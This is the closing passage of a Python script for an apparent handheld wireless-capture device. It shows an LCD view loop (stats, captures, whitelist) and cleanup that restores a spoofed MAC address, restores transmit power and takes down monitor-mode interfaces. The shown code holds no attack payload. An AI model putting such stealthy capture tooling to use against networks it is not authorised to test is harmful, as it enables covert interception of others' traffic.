                time.sleep(0.3)

            elif btn == "UP":
                scroll = max(0, scroll - 1)
                time.sleep(0.15)

            elif btn == "DOWN":
                scroll += 1
                time.sleep(0.15)

            if view == "face":
                _draw_face(lcd, font_obj, font_sm)
            elif view == "stats":
                _draw_stats(lcd, font_obj, font_sm, scroll)
            elif view == "captures":
                _draw_captures(lcd, font_obj, font_sm, scroll)
            elif view == "whitelist":
                _draw_whitelist(lcd, font_obj, font_sm, scroll)

            time.sleep(0.05)

    finally:
        _shutdown.set()
        _capture_event.clear()
        _save_stats()
        _save_config()
        if stealth_enabled and mon_iface:
            _restore_mac(mon_iface, original_mac)
            _restore_tx_power(mon_iface)
        time.sleep(0.5)
        _monitor_down(mon_iface)
        if mon_iface2:
            _monitor_down(mon_iface2)
        try:
            lcd.LCD_Clear()
        except Exception:
            pass
        GPIO.cleanup()

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
